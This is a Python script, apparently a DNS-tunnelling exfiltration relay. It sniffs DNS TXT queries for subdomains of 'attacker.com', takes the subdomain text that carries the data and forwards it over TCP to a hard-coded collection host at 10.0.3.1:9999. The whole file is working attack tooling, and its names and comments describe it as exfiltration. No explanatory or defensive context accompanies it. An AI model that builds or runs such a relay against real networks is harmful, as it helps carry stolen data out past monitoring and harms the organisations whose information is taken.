from scapy.all import sniff, UDP, DNS, DNSQR
import socket
import sys
import threading
import time


EXFILTRATION_HOST = '10.0.3.1'  # The IP address of the destination machine
EXFILTRATION_PORT = 9999       # The port to use for the TCP connection


from queue import Queue
subdomain_queue = Queue()

def exfiltrate_data():
    """
    Function to handle the data exfiltration via TCP.
    It runs in a separate thread.
    """
    while True:
        subdomain = subdomain_queue.get()
        if subdomain is None:  # Sentinel value to exit thread
            break
        
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)  
                s.connect((EXFILTRATION_HOST, EXFILTRATION_PORT))
                print(f"Connected to {EXFILTRATION_HOST}:{EXFILTRATION_PORT}")
                s.sendall(subdomain.encode('utf-8') + b'\n')
                print(f"Sent: {subdomain}")
        except socket.error as e:
            print(f"Error sending data to {EXFILTRATION_HOST}:{EXFILTRATION_PORT} - {e}")
        finally:
            subdomain_queue.task_done()
        
        time.sleep(0.1) # Small delay to avoid hammering the socket

def process_packet(packet):
    """
    Callback function to process each sniffed packet.
    """
    try:
        # Check if the packet is a DNS query and contains a TXT record query
        if packet.haslayer(UDP) and packet.haslayer(DNS) and packet[DNS].qr == 0 and packet[DNS].qd.qtype == 16:
            query_name_bytes = packet[DNSQR].qname
            query_name = query_name_bytes.decode('utf-8').rstrip('.')
            
            # Filter for queries to attacker.com
            if query_name.endswith('.attacker.com'):
                # Extract the subdomain prefix
                subdomain = query_name.split('.attacker.com')[0]
                
                if subdomain:
                    print(f"DNS Query detected: {query_name} -> Extracted subdomain: {subdomain}")
                    # Put the subdomain in the queue for exfiltration
                    subdomain_queue.put(subdomain)
    except Exception as e:
        print(f"An error occurred while processing a packet: {e}")

if __name__ == "__main__":
    print("Starting DNS listener on port 53...")
    print(f"Exfiltration destination: {EXFILTRATION_HOST}:{EXFILTRATION_PORT}")

    exfil_thread = threading.Thread(target=exfiltrate_data, daemon=True)
    exfil_thread.start()

    try:
        # Sniff UDP packets on port 53.
        sniff(filter="udp port 53", prn=process_packet, store=0)
    except PermissionError:
        print("Permission denied. This script must be run as root.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nStopping DNS listener...")
    finally:
        # Add a sentinel value to the queue to tell the thread to exit
        subdomain_queue.put(None)
        exfil_thread.join()
        print("Script terminated.")
